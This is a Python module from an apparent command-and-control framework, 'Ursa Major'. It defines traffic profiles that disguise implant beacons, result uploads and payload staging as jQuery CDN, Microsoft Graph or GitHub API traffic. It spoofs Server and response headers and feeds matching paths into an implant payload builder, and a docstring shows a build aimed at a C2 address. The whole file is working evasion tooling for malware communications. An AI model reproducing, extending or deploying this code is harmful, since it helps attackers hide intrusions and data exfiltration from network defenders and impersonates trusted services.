"""Traffic profiles for Ursa Major — malleable C2 HTTP behaviour.

A TrafficProfile controls how the C2 server looks on the wire:
  - which URL paths it listens on
  - what HTTP response headers it returns
  - what Server: header it advertises
  - (optionally) what User-Agent it expects from implants

This lets beacon traffic blend in with legitimate-looking HTTP traffic.
Select the active profile via ursa.yaml:  major.traffic_profile: jquery

The profile's builder_tokens() method returns URSA_* token substitutions
for use with the payload builder so implants beacon to the correct paths:

    from implants.builder import Builder, PayloadConfig
    from major.profiles import get_profile

    profile = get_profile("office365")
    cfg = PayloadConfig(
        c2_url="http://10.0.0.1:6708",
        template="http_python",
        extra_tokens=profile.builder_tokens(),
    )
    source = Builder().build(cfg)

Available profiles
------------------
  default     Standard JSON API (no camouflage)
  jquery      Mimics cdnjs jQuery CDN traffic
  office365   Mimics Microsoft Graph API traffic
  github-api  Mimics GitHub REST API traffic

Adding a custom profile
-----------------------
  from major.profiles import PROFILES, TrafficProfile

  PROFILES["myprofile"] = TrafficProfile(
      name="myprofile",
      description="Mimics MyService API",
      server_header="MyService/1.0",
      urls={
          "register": "/api/v2/users/auth",
          "beacon":   "/api/v2/notifications",
          "result":   "/api/v2/events",
          "upload":   "/api/v2/attachments",
          "download": "/api/v2/media/{id}",
          "stage":    "/api/v2/assets/app.js",
      },
      response_headers={"X-Api-Version": "2.0"},
  )
"""

from __future__ import annotations

from dataclasses import dataclass, field


@dataclass
class TrafficProfile:
    """Defines how the C2 HTTP server presents itself on the wire."""

    name: str
    description: str
    server_header: str

    # C2 endpoint paths by logical name.
    # Supported keys: register, beacon, result, upload, download, stage.
    # Use {id} placeholder for the download path (e.g. "/cdn/files/{id}").
    urls: dict[str, str]

    # Extra HTTP headers included in every response.
    response_headers: dict[str, str] = field(default_factory=dict)

    # If non-empty, the server rejects beacons whose User-Agent doesn't
    # contain this string.  Leave empty to accept any User-Agent.
    user_agent_filter: str = ""

    # ── Builder integration ───────────────────────────────────────────────────

    def builder_tokens(self) -> dict[str, str]:
        """URSA_* path tokens for implant template substitution.

        Add these to PayloadConfig.extra_tokens so the builder injects the
        correct profile paths into the implant source:

            URSA_REGISTER_PATH  → profile's /register equivalent
            URSA_BEACON_PATH    → profile's /beacon equivalent
            URSA_RESULT_PATH    → profile's /result equivalent
            URSA_UPLOAD_PATH    → profile's /upload equivalent
            URSA_DOWNLOAD_PATH  → profile's /download equivalent (without {id})
            URSA_STAGE_PATH     → profile's /stage equivalent
        """
        def _strip_placeholder(path: str) -> str:
            """Remove /{id} suffix from dynamic paths."""
            if "{id}" in path:
                return path.split("{id}")[0].rstrip("/")
            return path

        return {
            "URSA_REGISTER_PATH": self.urls.get("register", "/register"),
            "URSA_BEACON_PATH":   self.urls.get("beacon",   "/beacon"),
            "URSA_RESULT_PATH":   self.urls.get("result",   "/result"),
            "URSA_UPLOAD_PATH":   self.urls.get("upload",   "/upload"),
            "URSA_DOWNLOAD_PATH": _strip_placeholder(self.urls.get("download", "/download")),
            "URSA_STAGE_PATH":    self.urls.get("stage",    "/stage"),
        }

    # ── Server routing ────────────────────────────────────────────────────────

    def reverse_map(self) -> dict[str, str]:
        """HTTP path → logical endpoint name, for server-side routing.

        Returns e.g.:
            {
                "/ajax/libs/jquery/3.6.4/jquery.js": "beacon",
                "/ajax/libs/jquery/3.6.0/jquery.min.js": "register",
                ...
            }

        Dynamic paths (containing {id}) are stripped to their prefix so the
        handler can do startswith() matching for downloads.
        """
        rev: dict[str, str] = {}
        for logical, path in self.urls.items():
            clean = path.split("{id}")[0].rstrip("/") if "{id}" in path else path
            rev[clean] = logical
        return rev

    def download_prefix(self) -> str:
        """The URL prefix used for file downloads (before the file ID)."""
        raw = self.urls.get("download", "/download/{id}")
        return raw.split("{id}")[0].rstrip("/") if "{id}" in raw else raw


# ── Built-in profiles ─────────────────────────────────────────────────────────

PROFILES: dict[str, TrafficProfile] = {

    "default": TrafficProfile(
        name="default",
        description="Standard JSON API — no camouflage (current server behaviour)",
        server_header="nginx/1.24.0",
        urls={
            "register": "/register",
            "beacon":   "/beacon",
            "result":   "/result",
            "upload":   "/upload",
            "download": "/download/{id}",
            "stage":    "/stage",
        },
        response_headers={},
    ),

    "jquery": TrafficProfile(
        name="jquery",
        description="Mimics cdnjs jQuery CDN — blends with JS library traffic",
        server_header="ECS (sec/96AE)",
        urls={
            "register": "/ajax/libs/jquery/3.6.0/jquery.min.js",
            "beacon":   "/ajax/libs/jquery/3.6.4/jquery.js",
            "result":   "/ajax/libs/jquery/3.7.1/jquery.slim.js",
            "upload":   "/ajax/libs/jquery/3.6.0/jquery.slim.min.js",
            "download": "/ajax/libs/jquery/3.5.1/{id}",
            "stage":    "/ajax/libs/jquery/3.6.1/jquery.min.map",
        },
        response_headers={
            "Cache-Control":       "public, max-age=31536000",
            "X-Cache":             "HIT",
            "Timing-Allow-Origin": "*",
            "Vary":                "Accept-Encoding",
        },
    ),

    "office365": TrafficProfile(
        name="office365",
        description="Mimics Microsoft Graph API — blends with O365 client traffic",
        server_header="Microsoft-IIS/10.0",
        urls={
            "register": "/api/v1.0/auth/token",
            "beacon":   "/api/v1.0/me/mailFolders/inbox/messages",
            "result":   "/api/v1.0/me/sendMail",
            "upload":   "/api/v1.0/me/drive/root/children",
            "download": "/api/v1.0/me/drive/items/{id}/content",
            "stage":    "/api/v1.0/me/photo/$value",
        },
        response_headers={
            "X-MS-RequestId":              "00000000-0000-0000-0000-000000000001",
            "request-id":                  "00000000-0000-0000-0000-000000000001",
            "Cache-Control":               "no-cache, no-store",
            "Strict-Transport-Security":   "max-age=31536000; includeSubDomains",
            "X-Content-Type-Options":      "nosniff",
        },
    ),

    "github-api": TrafficProfile(
        name="github-api",
        description="Mimics GitHub REST API — blends with developer/CI traffic",
        server_header="GitHub.com",
        urls={
            "register": "/api/v3/user/keys",
            "beacon":   "/api/v3/notifications",
            "result":   "/api/v3/repos/org/repo/issues",
            "upload":   "/api/v3/gists",
            "download": "/api/v3/repos/org/repo/releases/assets/{id}",
            "stage":    "/api/v3/repos/org/repo/contents/README.md",
        },
        response_headers={
            "X-GitHub-Request-Id":    "0000:0000:000000:000000:00000000",
            "X-RateLimit-Limit":      "5000",
            "X-RateLimit-Remaining":  "4999",
            "X-RateLimit-Reset":      "1893456000",
            "X-Content-Type-Options": "nosniff",
        },
    ),
}


# ── Accessor ──────────────────────────────────────────────────────────────────

def get_profile(name: str) -> TrafficProfile:
    """Return a named traffic profile.

    Falls back to "default" if the name is not found.
    """
    if name not in PROFILES:
        import warnings
        warnings.warn(
            f"Traffic profile '{name}' not found; using 'default'.",
            stacklevel=2,
        )
        return PROFILES["default"]
    return PROFILES[name]


def list_profiles() -> list[dict]:
    """Return metadata for all available profiles."""
    return [
        {
            "name":          p.name,
            "description":   p.description,
            "server_header": p.server_header,
            "endpoints":     len(p.urls),
        }
        for p in PROFILES.values()
    ]
